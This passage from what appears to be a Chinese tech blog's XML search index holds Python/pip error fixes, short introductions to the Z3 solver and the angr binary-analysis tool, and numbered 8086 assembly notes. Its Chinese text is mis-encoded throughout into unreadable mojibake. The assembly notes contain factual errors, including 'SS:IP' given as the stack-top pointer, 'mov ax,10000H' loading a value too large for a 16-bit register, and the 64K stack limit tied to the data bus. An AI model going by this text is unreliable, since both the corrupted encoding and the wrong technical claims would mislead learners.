â€œ/usr/lib/python2.7/dist-packages/pip/index.pyâ€, line 757, in get_page â€œCache-Controlâ€: â€œmax-age=600â€, File â€œ/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.pyâ€, line 480, in get return self.request(â€˜GETâ€™, url, *kwargs) File â€œ/usr/lib/python2.7/dist-packages/pip/download.pyâ€, line 378, in request return super(PipSession, self).request(method, url, *args, *kwargs) File â€œ/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.pyâ€, line 468, in request resp = self.send(prep, *send_kwargs) File â€œ/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/sessions.pyâ€, line 576, in send r = adapter.send(request, *kwargs) File â€œ/usr/share/python-wheels/CacheControl-0.11.5-py2.py3-none-any.whl/cachecontrol/adapter.pyâ€, line 46, in send resp = super(CacheControlAdapter, self).send(request, **kw) File â€œ/usr/share/python-wheels/requests-2.9.1-py2.py3-none-any.whl/requests/adapters.pyâ€, line 376, in send timeout=timeout File â€œ/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/connectionpool.pyâ€, line 610, in urlopen _stacktrace=sys.exc_info()[2]) File â€œ/usr/share/python-wheels/urllib3-1.13.1-py2.py3-none-any.whl/urllib3/util/retry.pyâ€, line 228, in increment total -= 1TypeError: unsupported operand type(s) for -=: â€˜Retryâ€™ and â€˜intâ€™ è§£å†³åŠžæ³•:(ä¸»è¦æ˜¯pipçš„ç‰ˆæœ¬é—®é¢˜å¼•èµ·çš„) easy_install pip pip install â€“upgrade pip (æ­¤å¤„æ‰§è¡ŒåŽŸæœ¬è¦è¿›è¡Œçš„å‘½ä»¤) æŠ¥é”™2:AttributeError: â€˜moduleâ€™ object has no attribute â€˜b64encodeâ€™ import base64å‡ºçŽ°çš„æŠ¥é”™ åŽŸå› ï¼š.pycæ–‡ä»¶å‡ºçŽ°çš„é—®é¢˜ è§£å†³åŠžæ³•ï¼šå°†base64.pyé‡å‘½åï¼Œå¹¶åˆ é™¤pycæ–‡ä»¶ã€‚ Pythonè¿è¡Œæ—¶ï¼Œä¼šå…ˆæŸ¥æ‰¾è¯¥ç¨‹åºæ‰€åœ¨è·¯å¾„ï¼Œæ˜¯å¦æœ‰ç›¸å…³çš„æ¨¡å—ï¼Œæœ‰åˆ™ç›´æŽ¥å¼•ç”¨ã€‚æ­£å¥½è¯¥ç›®å½•ä¸‹æœ‰ä¸€ä¸ªbase64.pyæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶éžå®˜æ–¹çš„base64åº“ã€‚ 1.ä»€ä¹ˆæ˜¯pycæ–‡ä»¶ï¼Ÿ pycæ–‡ä»¶æ˜¯pythonç¼–è¯‘åŽçš„å­—èŠ‚ç æ–‡ä»¶ã€‚Pythonçš„ç¨‹åºä¸­ï¼Œæ˜¯æŠŠåŽŸå§‹ç¨‹åºä»£ç æ”¾åœ¨.pyæ–‡ä»¶é‡Œï¼Œè€ŒPythonä¼šåœ¨æ‰§è¡Œ.pyæ–‡ä»¶çš„æ—¶å€™ã€‚å°†.pyå½¢å¼çš„ç¨‹åºç¼–è¯‘æˆä¸­é—´å¼æ–‡ä»¶ï¼ˆbyte-compiledï¼‰çš„.pycæ–‡ä»¶ï¼Œè¿™ä¹ˆåšçš„ç›®çš„å°±æ˜¯ä¸ºäº†åŠ å¿«ä¸‹æ¬¡æ‰§è¡Œæ–‡ä»¶çš„é€Ÿåº¦ã€‚ 2.Pythonè¿è¡Œè¿‡ç¨‹ Pythonæ˜¯ä¸€ç§è§£é‡Šåž‹è¯­è¨€ï¼Œæ¯æ¬¡æ‰§è¡Œéƒ½éœ€è¦è¿›è¡Œä¸€æ¬¡ç¿»è¯‘ã€‚æ‰§è¡Œ python *.py åŽï¼Œå°†ä¼šå¯åŠ¨ Python çš„è§£é‡Šå™¨ï¼Œå°† *.py ç¼–è¯‘æˆä¸€ä¸ªå­—èŠ‚ç å¯¹è±¡ PyCodeObjectï¼Œå­˜æ”¾åœ¨å†…å­˜ï¼Œå½“è¿™ä¸ªæ¨¡å—çš„ Python ä»£ç æ‰§è¡Œå®Œä¹‹åŽå°±ä¼šå°†ç¼–è¯‘ç»“æžœä¿å­˜åˆ° *.pycæ–‡ä»¶ä¸­ï¼Œä¸‹ä¸€æ¬¡å°±ä¸éœ€è¦ç¼–è¯‘ï¼Œç›´æŽ¥åŠ è½½åˆ°å†…å­˜ä¸­ã€‚ a.æ¨¡å—åœ¨è¢«å¯¼å…¥æ—¶ä¼šå…ˆæ£€æŸ¥æœ¬åœ°ç›®å½•ä¸‹æ˜¯å¦æœ‰pycæ–‡ä»¶ b.è‹¥æœ‰pycæ–‡ä»¶ï¼Œå¯¹æ¯”pyæ–‡ä»¶çš„ä¿®æ”¹æ—¶é—´æ˜¯å¦ä¸€è‡´ï¼Œè‹¥ä¸€è‡´ï¼Œç›´æŽ¥ä½¿ç”¨pycæ–‡ä»¶ï¼Œè‹¥ä¸ä¸€è‡´ï¼Œå¯¹pyæ–‡ä»¶è¿›è¡Œè§£é‡Šï¼Œå¹¶å°†ç»“æžœè¦†ç›–æœ¬åœ°çš„pycæ–‡ä»¶ c.è‹¥æœªæ‰¾åˆ°pycæ–‡ä»¶ï¼Œå¯¹pyæ–‡ä»¶è¿›è¡Œè§£é‡Šï¼Œå¹¶å°†ç»“æžœå›žå†™åˆ°æœ¬åœ°çš„pycæ–‡ä»¶ä¸­ é‡åå‡ºçŽ°çš„é—®é¢˜ æŠ¥é”™4:pythonå‰æ³¨é‡Š12#!/usr/bin/env python# -*- coding:utf-8 -*- æŠ¥é”™5ï¼šIndentationError: unexpected indent æ­¤å¤„æœ‰ä¸€ä¸ªæ„æ–™ä¹‹å¤–çš„ç¼©è¿› IndentationError:expected an indented block æ­¤å¤„éœ€è¦ä¸€ä¸ªç¼©è¿› æ³¨æ„ç©ºæ ¼ä¸ŽTabä¸èƒ½æ··ç”¨ æŠ¥é”™6ï¼šSyntaxError: unexpected EOF while parsing æœªéªŒè¯å‡½æ•°å‚æ•°æ˜¯å¦æœ‰æ•ˆï¼Œä¼ å…¥äº†ç©ºçš„å‚æ•°ã€‚ å¿«é€ŸæŸ¥æ‰¾pythonå®‰è£…è·¯å¾„çš„æ–¹æ³•ï¼šæ‰“å¼€cmd 12345pythonimport sysprint(sys.path) æ‰“å°å‡ºæ¥çš„ç¬¬å››ä¸ªå³pythonçš„å®‰è£…è·¯å¾„ã€‚ æŠ¥é”™7123456CondaHTTPError: HTTP 000 CONNECTION FAILED for url &lt;https://conda.anaconda.org/conda-forge/win-64/repodata.json&gt;Elapsed: -An HTTP error occurred when trying to retrieve this URL.HTTP errors are often intermittent, and a simple retry will get you on your way.&apos;https://conda.anaconda.org/conda-forge/win-64&apos; è¿žæŽ¥å›½å¤–çš„æœåŠ¡å™¨è¶…æ—¶ï¼Œè¦æ¢æˆå›½å†…é•œåƒæºã€‚ æŠ¥é”™81[WinError 193] %1 ä¸æ˜¯æœ‰æ•ˆçš„ Win32 åº”ç”¨ç¨‹åºã€‚ pythonä½æ•°ä¸Ždllä½æ•°ä¸åŒï¼Œéœ€è¦ç»Ÿä¸€ã€‚]]></content>
      <tags>
        <tag>error</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Z3çº¦æŸæ±‚è§£å™¨]]></title>
    <url>%2F2019%2F07%2F14%2FZ3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3%E5%99%A8%2F</url>
    <content type="text"><![CDATA[å¦‚æžœé«˜ä¸­æ•°å­¦ç»™æˆ‘ä»¬ç”¨Z3å°±å¥½äº† 0X00:IntroductionZ3æ±‚è§£å™¨ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªéžå¸¸ä¾¿åˆ©æ±‚è§£æ–¹å¼ï¼Œæˆ‘ä»¬åªéœ€è¦å®šä¹‰æœªçŸ¥é‡ï¼ˆx,yç­‰ï¼‰ï¼Œç„¶åŽä¸ºè¿™äº›æœªçŸ¥é‡æ·»åŠ çº¦æŸæ–¹å¼å³å¯æ±‚è§£ã€‚ 0X01:åŸºæœ¬ç”¨æ³•x = Int(â€˜xâ€™) y = Int(â€˜yâ€™) solve(x &gt; 2, y &lt; 10, x + 2*y == 7) é¦–å…ˆè¦å®šä¹‰è¦æ±‚è§£çš„å‡ ä¸ªå‚æ•°ï¼Œç„¶åŽç”¨å˜é‡æŠŠæ ¸å¿ƒçš„æ–¹ç¨‹æ­å»ºå‡ºæ¥ï¼Œä¹‹åŽå°±ä¼šè‡ªåŠ¨æ±‚è§£ï¼Œæœ€åŽæ‰“å°å‡ºæ¥å°±è¡Œã€‚ åŸºæœ¬çš„æ¡†æž¶å¦‚æ­¤ï¼Œå…·ä½“çš„ä»£ç è¿˜æ˜¯è¦å¤šåœ¨å®žé™…ä¸­å†™ã€‚è™½ç„¶CTFé€†å‘æ¯”èµ›ä¸­é‡ç‚¹è€ƒå¯Ÿçš„æ˜¯é€†å‘çš„èƒ½åŠ›ï¼Œé‡‡ç”¨æ±‚è§£å™¨çš„æ–¹å¼æ¥æ±‚è§£å¹¶ä¸èƒ½é”»ç‚¼åˆ°è‡ªå·±çš„é€†å‘é€»è¾‘ï¼Œè‡ªå·±è‚æ‰æ˜¯å¤§ä½¬ã€‚]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angr]]></title>
    <url>%2F2019%2F07%2F14%2Fangr%2F</url>
    <content type="text"><![CDATA[0X00:Introductionangræ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ä»£ç åˆ†æžå·¥å…·ï¼Œèƒ½å¤Ÿè‡ªåŠ¨åŒ–å®ŒæˆäºŒè¿›åˆ¶æ–‡ä»¶çš„åˆ†æžï¼Œå¹¶æ‰¾å‡ºæ¼æ´žï¼Œæ˜¯ä¸€ä¸ªåŸºäºŽpythonçš„äºŒè¿›åˆ¶æ¼æ´žåˆ†æžæ¡†æž¶ï¼Œå®ƒå°†ä»¥å‰å¤šç§åˆ†æžæŠ€æœ¯é›†æˆè¿›æ¥ï¼ŒÂ­Â­Â­å®ƒèƒ½å¤Ÿè¿›è¡ŒåŠ¨æ€çš„ç¬¦å·æ‰§è¡Œåˆ†æžï¼Œä¹Ÿèƒ½å¤Ÿè¿›è¡Œå¤šç§é™æ€åˆ†æžã€‚ 0X01:åŸºæœ¬è¿‡ç¨‹ å°†äºŒè¿›åˆ¶ç¨‹åºè½½å…¥angråˆ†æžç³»ç»Ÿ å°†äºŒè¿›åˆ¶ç¨‹åºè½¬æ¢æˆä¸­é—´è¯­è¨€ å°†IRè¯­è¨€è½¬æ¢æˆè¯­ä¹‰è¾ƒå¼ºçš„è¡¨è¾¾å½¢å¼ æ‰§è¡Œè¿›ä¸€æ­¥çš„åˆ†æž 0X02ï¼šç”¨æ³•angr-CLEï¼šé¦–å…ˆåŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåœ¨åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶çš„æ—¶å€™ä¼šåˆ†æžç—…è¯»å–binaryçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æŒ‡ä»¤åœ°å€ã€shared libraryã€arch informationç­‰ç­‰ã€‚ import angr b = angr.Project(â€œ./testâ€) angr_IRï¼šangrç”¨VEX IRå°†æŒ‡ä»¤è½¬åŒ–ä¸ºä¸­é—´è¯­è¨€IRangr-Solver Engineï¼š import claripybv = claripy.BVV(0x41424344, 32) ArchInfoArchinfoæ˜¯åŒ…å«ç‰¹å®šäºŽä½“ç³»ç»“æž„çš„ä¿¡æ¯çš„ç±»çš„é›†åˆã€‚ä¾‹å¦‚ï¼Œlittle-endian amd64ã€little-endian i386ã€‚ PyVexPyVexæ˜¯ä¸­é—´è¯­è¨€ï¼ŒAngrä½¿ç”¨Valgrindçš„ä¸­é—´è¯­è¨€â€”â€”VEXæ¥å®Œæˆè¿™æ–¹é¢çš„å†…å®¹ã€‚VEXä¸­é—´è¯­è¨€æŠ½è±¡äº†å‡ ç§ä¸åŒæž¶æž„é—´çš„åŒºåˆ«ï¼Œå…è®¸åœ¨ä»–ä»¬ä¹‹ä¸Šè¿›è¡Œç»Ÿä¸€çš„åˆ†æžã€‚å„ç§ä¸­é—´è¯­è¨€åœ¨è®¾è®¡ç†å¿µä¸Šæœ‰å¾ˆå¤šçš„å…±é€šç‚¹ SimuVEXSimuVEXæ¨¡å—æ˜¯ä¸­é—´è¯­è¨€VEXæ‰§è¡Œçš„æ¨¡æ‹Ÿå™¨ï¼Œå®ƒå…è®¸ä½ æŽ§åˆ¶ç¬¦å·æ‰§è¡Œã€‚ Angræ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„å·¥å…·ï¼Œå¯¹è¿›è¡Œè¿‡ä»£ç æ··æ·†çš„ä»£ç ï¼Œæ— æ³•åœ¨IDAä¸­åç¼–è¯‘ï¼Œä½†èƒ½å¤Ÿç”¨è¿™ä¸ªå·¥å…·ã€‚]]></content>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ±‡ç¼–]]></title>
    <url>%2F2019%2F07%2F12%2F%E6%B1%87%E7%BC%96%2F</url>
    <content type="text"><![CDATA[ä¸‹å­¦æœŸå¼€è¯¾ï¼Œå¤ä¹ ä¸€ä¸‹ã€‚ 1.æŒ‡ä»¤ä¸Žæ•°æ®åœ¨å†…å­˜ä¸­çš„éƒ½æ˜¯ä»¥åŒæ ·çš„äºŒè¿›åˆ¶æµå­˜æ”¾çš„ï¼ŒåŒºåˆ«ä¹‹å¤„åœ¨äºŽæ˜¯ä»Žå“ªæ ¹æ€»çº¿ï¼ˆæ•°æ®æ€»çº¿/æŽ§åˆ¶æ€»çº¿ï¼‰ä¼ å…¥ã€‚2.åœ°å€æ€»çº¿å®½åº¦å†³å®šCPUçš„ å¯»å€èƒ½åŠ›ã€‚2çš„Næ¬¡æ–¹ä¸ªã€‚æ•°æ®æ€»çº¿çš„å®½åº¦å†³å®šäº†æ•°æ®çš„ä¼ è¾“é€Ÿåº¦ã€‚æŽ§åˆ¶æ€»çº¿çš„å®½åº¦å†³å®šäº†æŽ§åˆ¶èƒ½åŠ›ã€‚3.æ ¸å¿ƒæ€ç»´ï¼šä»ŽCPUçš„è§’åº¦åŽ»è€ƒè™‘é—®é¢˜ã€‚4.å¯„å­˜å™¨ä¸­ï¼Œæ•°æ®æ˜¯é‡‡ç”¨çš„å°ç«¯åºå­˜å‚¨ã€‚5.AX=AH+ALï¼ŒEAXæ˜¯32ä½å¯„å­˜å™¨ï¼ŒAXæ˜¯16ä½ï¼ŒAH/ALæ˜¯8ä½6.æ±‡ç¼–æŒ‡ä»¤ä¸åŒºåˆ†å¤§å°å†™ã€‚7.8226H+8826Hï¼Œåœ¨axä¸­å°±ä¼šå˜æˆ044Cï¼ˆæœ¬æ¥æ˜¯1044Cï¼‰ï¼Œå¤šå‡ºæ¥çš„1ä¼šåœ¨æ ‡å¿—ä½ä¸­æ˜¾ç¤ºã€‚æ³¨æ„å¯¹AHå’ŒALè¿ç®—æ—¶ï¼Œä¸èƒ½è¶Šç•Œã€‚8.8086çš„CPUå†…éƒ¨ç»“æž„ä¸º16ä½ï¼Œåªèƒ½ä¼ é€16ä½çš„åœ°å€ï¼Œæ‰€ä»¥å¯»å€èƒ½åŠ›åªæœ‰64Kã€‚ä½†æ˜¯å…¶åœ°å€æ€»çº¿çš„å®½åº¦ä¸º20ä½ï¼Œå¯»å€èƒ½åŠ›æœ‰1Mã€‚æ‰€ä»¥é‡‡ç”¨16ä½æ®µåœ°å€ä¸Ž16ä½åç§»åœ°å€ï¼Œç»è¿‡åœ°å€åŠ æ³•å™¨åˆå¹¶ä¸º20ä½çš„ç‰©ç†åœ°å€åŽï¼Œå†è¿›è¡Œè¾“å‡ºã€‚ 9.åœ°å€åŠ æ³•å™¨çš„å·¥ä½œåŽŸç†ï¼šç‰©ç†åœ°å€ç­‰äºŽæ®µåœ°å€X16ï¼ˆå³åœ¨æœ«ç«¯åŠ ä¸Šä¸ª0ï¼Œæ•°æ®å·¦ç§»4ä½ã€‚ï¼‰å†åŠ ä¸Šåç§»åœ°å€ã€‚10.ä¸€ä¸ªæ•°æ®çš„Xè¿›åˆ¶å½¢å¼å·¦ç§»ä¸€ä½ï¼Œå³ç›¸å½“äºŽä¹˜ä¸ŠXã€‚11.CPUä¸­çš„å†…å­˜æ˜¯è¿žç»­çš„ï¼Œä½†æ˜¯äººä¸ºçš„åˆ’åˆ†å¯ä»¥åˆ†æˆæ®µã€‚æ®µåœ°å€X16å¯ä»¥å¾—åˆ°åŸºç¡€åœ°å€ï¼ŒåŠ ä¸Šåç§»åœ°å€å¾—åˆ°ç‰©ç†åœ°å€ã€‚12.åç§»åœ°å€ä¸º16ä½ï¼Œæ‰€ä»¥å…è®¸çš„ä¸€ä¸ªæ®µçš„é•¿åº¦æœ€å¤§ä¸º64Kã€‚13.CPUå¯ä»¥é€šè¿‡ä¸åŒçš„æ®µåœ°å€ä¸Žåç§»åœ°å€å½¢æˆä¸€ä¸ªç‰©ç†åœ°å€ã€‚14.æ•°æ®åœ¨ä¸€ä¸ªå­˜å‚¨å•å…ƒä¸­ï¼Œå¯ä»¥æœ‰ä¸¤ç§ä¸åŒçš„è¡¨è¿°ï¼šå¦‚æ•°æ®è¢«å­˜å‚¨åœ¨21F60Hçš„å­˜å‚¨å•å…ƒä¸­ï¼Œå¯ä»¥è¡¨ç¤ºä¸ºâ€æ•°æ®åœ¨å†…å­˜2000ï¼š1F60Hã€‚â€ä¹Ÿå¯ä»¥è¡¨ç¤ºä¸ºâ€æ•°æ®åœ¨å†…å­˜çš„2000æ®µä¸­çš„1F60Hå…ƒä¸­ã€‚ 15.å¯ä»¥æ ¹æ®éœ€è¦ï¼Œå°†ä¸€ç»„è¿žç»­çš„ä¸”èµ·å§‹åœ°å€ä¸º16å€æ•°çš„å†…å­˜ç©ºé—´å®šä¹‰ä¸ºä¸€ä¸ªæ®µã€‚16.æ®µå¯„å­˜å™¨å°±æ˜¯æä¾›æ®µåœ°å€çš„ï¼Œ8086CPUæœ‰4ä¸ªæ®µå¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯CSï¼ˆcodeï¼‰ï¼ŒDSï¼ˆdata),SS(stack),ES(extra)ã€‚17.ä¸€ä¸ªå®è§‚çš„æƒ³æ³•ï¼šæ— è®ºæ˜¯ç¨‹åºè¿˜æ˜¯æ•°æ®ï¼Œå½“å…¶åŠ è½½åˆ°å†…å­˜ä¸­ä¹‹åŽï¼Œéƒ½æ˜¯ä¸€æ®µäºŒè¿›åˆ¶ä»£ç æµã€‚å…¶ä¸­çš„ä¸€éƒ¨åˆ†ç”±æŽ§åˆ¶æ€»çº¿ä¼ å…¥è½¬åŒ–æˆå‘½ä»¤ï¼Œå…¶ä¸­çš„ä¸€éƒ¨ç”±æ•°æ®æ€»çº¿ä¼ å…¥è½¬åŒ–æˆåå…­è¿›åˆ¶æ•°æ®ã€‚18.CSä¸ŽIPï¼Œä¸º8086CPUæœ€é‡è¦çš„ä¸¤ä¸ªå¯„å­˜å™¨ï¼ŒæŒ‡ç¤ºäº†CPUå½“å‰è¦è¯»å–çš„æŒ‡ä»¤çš„åœ°å€ï¼ŒCSä¸ºä»£ç æ®µå¯„å­˜å™¨ï¼ŒIPä¸ºæŒ‡é’ˆå¯„å­˜å™¨ã€‚ å³ä»»æ„æ—¶åˆ»ï¼ŒCPUå°†CS:IPæŒ‡å‘çš„å†…å®¹å½“ä½œæŒ‡ä»¤æ‰§è¡Œã€‚19.ç‰©ç†åœ°å€ä»Žåœ°å€æ€»çº¿ä¼ åˆ°å†…å­˜ä¸­åŽï¼Œè¯»å–å†…å­˜å•å…ƒä¸­å­˜æ”¾çš„æŒ‡ä»¤ï¼ŒæŒ‡ä»¤é€šè¿‡æ•°æ®æ€»çº¿é€”ç»è¾“å…¥è¾“å‡ºæŽ§åˆ¶ç”µè·¯ï¼Œåˆ°è¾¾æŒ‡ä»¤ç¼“å†²å™¨ã€‚ä¸”è¯»å–ä¸€æ¡æŒ‡ä»¤åŽï¼ŒIPçš„å€¼ä¼šè‡ªåŠ¨å¢žåŠ ï¼Œä½¿CPUå¯ä»¥è¯»å–ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆæ ¹æ®å½“å‰è¯»å–çš„æŒ‡ä»¤é•¿åº¦è€ŒåŠ ä¸Šè¯¥é•¿åº¦åˆ°è¾¾ä¸‹ä¸€æ¡æŒ‡ä»¤ä½ç½®ã€‚ï¼‰ã€‚20.èƒ½å¤Ÿæ”¹å˜CS/IPå†…å®¹çš„æŒ‡ä»¤è¢«ç§°ä¸ºè½¬ç§»æŒ‡ä»¤ï¼›æœ€ç®€å•çš„è½¬ç§»æŒ‡ä»¤ï¼šjmpã€‚jmp æ®µåœ°å€ï¼šåç§»åœ°å€ï¼Œè¯¾å°†CSå’ŒIPä¿®æ”¹åˆ°æŒ‡å®šå€¼ã€‚åŒæ—¶jmp+æŸä¸€åˆæ³•å¯„å­˜å™¨çš„å€¼å¯åªä¿®æ”¹IPã€‚21.subï¼Œå‡æ³•è¿ç®—ã€‚sub axï¼Œbxï¼Œå³ä¸ºax-bxã€‚22.å†…å­˜ä¸­å­—çš„å­˜å‚¨ï¼šé«˜ä½å¯¹åº”é«˜ä½Žå€ä½ï¼Œä½Žä½å¯¹åº”ä½Žåœ°å€ä½ã€‚æ‰€ä»¥å¯¹äºŽä¸€ä¸ªå†…å­˜å•å…ƒä¸­çš„æ•°ï¼Œåº”è¯¥ä»Žä¸‹å¾€ä¸Šè¯»å–ã€‚23.å­—å•å…ƒï¼šå­˜æ”¾ä¸€ä¸ªå­—åž‹æ•°æ®ï¼ˆ16ä½ï¼‰çš„å†…å­˜å•å…ƒï¼Œç”±ä¸¤ä¸ªåœ°å€è¿žç»­çš„å†…å­˜å•å…ƒç»„æˆã€‚24.movæŒ‡ä»¤è¿˜å¯ä»¥å°†ä¸€ä¸ªå†…å­˜å•å…ƒä¸­çš„å†…å®¹é€å…¥å¯„å­˜å™¨ã€‚mov å¯„å­˜å™¨åï¼Œå†…å­˜å•å…ƒåœ°å€ã€‚[â€¦]è¡¨ç¤ºåç§»åœ°å€ï¼Œå¦å¤–ç¡®å®šå†…å­˜å•å…ƒæ‰€éœ€çš„æ®µåœ°å€ç”±DSå†³å®šï¼ˆä¸€è‡´ï¼‰ã€‚å°†å¯„å­˜å™¨ä¸­çš„å†…å®¹é€å…¥å†…å­˜å•å…ƒè¡¨ç¤ºä¸ºï¼šmov [â€¦]ï¼Œå¯„å­˜å™¨åã€‚25.8086CPUä¸æ”¯æŒç›´æŽ¥å°†æ•°æ®å†™å…¥æ®µå¯„å­˜å™¨ï¼Œå¿…é¡»å…ˆé€šè¿‡æ”¹å˜å…¶ä»–å¯„å­˜å™¨çš„å€¼ï¼Œç„¶åŽå¯„å­˜å™¨ä¸Žå¯„å­˜å™¨é—´è¿›è¡Œæ“ä½œï¼Œæ‰èƒ½æ”¹å˜æ®µå¯„å­˜å™¨çš„å€¼ã€‚ æŒ‡ä»¤ä¸­åªå†™åç§»åœ°å€ï¼Œæ®µåœ°å€éœ€è¦åœ¨äº‹å…ˆæ”¹å˜ã€‚26.movçš„ç”¨æ³•å°ç»“ï¼šmov å¯„å­˜å™¨ï¼Œæ•°æ®/mov å¯„å­˜å™¨ï¼Œå¯„å­˜å™¨/mov å¯„å­˜å™¨ï¼Œå†…å­˜å•å…ƒ/mov å†…å­˜å•å…ƒï¼Œå¯„å­˜å™¨/mov æ®µå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨/mov å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨ã€‚27.ç±»æ¯”ä»£ç æ®µå¾—åˆ°æ•°æ®æ®µçš„å®šä¹‰æ–¹æ³•ï¼šå°†æŸä¸º16å€æ•°çš„åœ°å€ä½œä¸ºé¦–åœ°å€ï¼Œä¸è¶…è¿‡64Kçš„é•¿åº¦ä½œä¸ºæ•°æ®æ®µé•¿åº¦ï¼ŒæŠŠdxæ®µå¯„å­˜å™¨æ”¹ä¸ºé¦–åœ°å€å³å¯ã€‚28.å­—åž‹æ•°æ®â€“&gt;åç§»åœ°å€å·®ä¸º2ä½ã€‚29.çŽ°å¦‚ä»Šçš„CPUéƒ½æœ‰æ ˆçš„è®¾è®¡ï¼Œ8086CPUæä¾›ç›¸å…³æŒ‡ä»¤ä»¥æ ˆçš„å½¢å¼è®¿é—®å†…å­˜ï¼Œæ‰€ä»¥åœ¨åŸºäºŽ8086CPUç¼–ç¨‹çš„æ—¶å€™ï¼Œå¯ä»¥å°†ä¸€æ®µè¿žç»­çš„å†…å­˜ç©ºé—´ä½œä¸ºæ ˆä½¿ç”¨ã€‚30.ä»Žç¨‹åºåŒ–çš„è§’åº¦æ¥çœ‹ï¼Œå¿…é¡»æœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘æ ˆæœ€ä¸Šé¢çš„å…ƒç´ ã€‚ 31.å¦‚ä½•çŸ¥é“ä¸€æ®µå†…å­˜ç©ºé—´è¢«å½“ä½œæ ˆæ¥ä½¿ç”¨ï¼Ÿå¦‚ä½•çŸ¥é“æŽ¥ä¸‹æ¥è¦æ“ä½œçš„æ ˆä¸­æ•°æ®å“ªä¸ªæ˜¯åœ¨æ ˆé¡¶çš„ã€‚ç±»ä¼¼äºŽCS:IP,8086CPUä¸­ï¼ŒSSï¼šIPå§‹ç»ˆæŒ‡å‘æ ˆé¡¶ã€‚32.æ ˆé¡¶æŒ‡é’ˆå¯ä»¥æŒ‡åˆ°æœ€åº•å±‚ã€‚33.POPæˆ–è€…PUSHæŒ‡ä»¤ï¼Œåœ¨ä¸¤ç§æžç«¯æƒ…å†µä¸‹éƒ½ä¼šé€ æˆæ ˆæº¢å‡ºã€‚34.æ ˆæ˜¯ä¸€ç§å¯ä»¥è¢«ç‰¹æ®Šè®¿é—®çš„å†…å­˜ç©ºé—´ã€‚35.PUSHæŒ‡ä»¤å’ŒPOPæŒ‡ä»¤ï¼Œå¯ä»¥åœ¨å†…å­˜ä¸Žå¯„å­˜å™¨ä¹‹é—´ä¼ é€’æ•°æ®ï¼Œä¹Ÿå¯ä»¥åœ¨å¯„å­˜å™¨ä¸Žå¯„å­˜å™¨ä¹‹é—´ï¼Œå†…å­˜ä¸Žå†…å­˜ä¹‹é—´ä¼ é€’æ•°æ®ã€‚ç”±äºŽæ ˆä¸­çš„æ“ä½œå¯¹è±¡ï¼ˆæ ˆé¡¶æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—åž‹æ•°æ®ç¡®å®šï¼Œæ‰€ä»¥åœ¨æŒ‡ä»¤ä¸­åªéœ€å†™åç§»æŒ‡ä»¤æˆ–è€…å¯„å­˜å™¨åç§°ã€‚36.æ ˆé¡¶æ¸…é›¶ä¸èƒ½ç”¨MOV AX,0ã€‚è¦ç”¨SUB AX,AXã€‚ 37.å°†10000H~1000FHçš„ç©ºé—´å½“ä½œæ ˆçš„åˆå§‹åŒ–æ±‡ç¼–ä»£ç ï¼šmov ax,10000Hmov ss,axmov sp,0010H ssæ˜¯æ®µå¯„å­˜å™¨ï¼Œä¸èƒ½è¢«ç›´æŽ¥èµ‹å€¼ã€‚æ³¨æ„åŽé¢æ ˆé¡¶æŒ‡é’ˆçš„æŒ‡å‘ï¼Œå®žé™…ä¸Šå·²ç»è¶…å‡ºäº†æ ˆçš„èŒƒå›´ï¼Œåœ¨æ ˆåº•çš„ä¸‹é¢ä¸€ä½æ›´é«˜åœ°å€ã€‚38.push axæ˜¯å…¥æ ˆæŒ‡ä»¤ï¼Œå®ƒå°†åœ¨æ ˆé¡¶ä¹‹ä¸ŠåŽ‹å…¥æ–°çš„æ•°æ®ã€‚ä¸€å®šè¦æ³¨æ„å…¶æ‰§è¡Œè¿‡ç¨‹æ˜¯ï¼šå…ˆå°†è®°å½•æ ˆé¡¶åç§»åœ°å€çš„SPå‡2ï¼Œä½¿å¾—SSï¼šSPæŒ‡å‘æ–°çš„å†…å­˜å•å…ƒï¼Œç„¶åŽå†å°†æ•°æ®å†™å…¥å†…å­˜å•å…ƒä¸­ã€‚39.æˆ‘ä»¬è¦ååˆ†æ¸…æ¥šçš„æ˜¯ï¼špushå’ŒpopæŒ‡ä»¤ä¸ŽmovæŒ‡ä»¤ä¸åŒï¼ŒCPUæ‰§è¡ŒmovæŒ‡ä»¤åªéœ€ä¸€æ­¥æ“ä½œï¼Œå³ä¼ é€ã€‚è€Œæ‰§è¡ŒpushæŒ‡ä»¤æ—¶ï¼Œå®žé™…ä¸Šæœ‰ä¸¤æ­¥æ“ä½œï¼šå…ˆæ”¹å˜SPçš„å€¼ï¼ŒåŽå‘SS:SPå¤„ä¼ é€ã€‚æ‰§è¡ŒpopæŒ‡ä»¤æ—¶ï¼Œå…ˆè¯»å–SS:SPçš„æ•°æ®ï¼Œå†æ”¹å˜SPçš„å€¼ã€‚ 40.ä¸ºä»€ä¹ˆæ ˆçš„é•¿åº¦æœ€å¤§åªæœ‰64Kï¼Ÿä¸Žæ•°æ®æ€»çº¿æ˜¯16ä½æœ‰å…³ã€‚64X1024=2çš„16æ¬¡æ–¹ã€‚41.æ•°æ®æ®µæ²¡æœ‰æŒ‡é’ˆï¼Œç›´æŽ¥ç”¨åç§»åœ°å€ã€‚ 42.ä¼ªæŒ‡ä»¤ï¼Œä¼ªæŒ‡ä»¤æ— 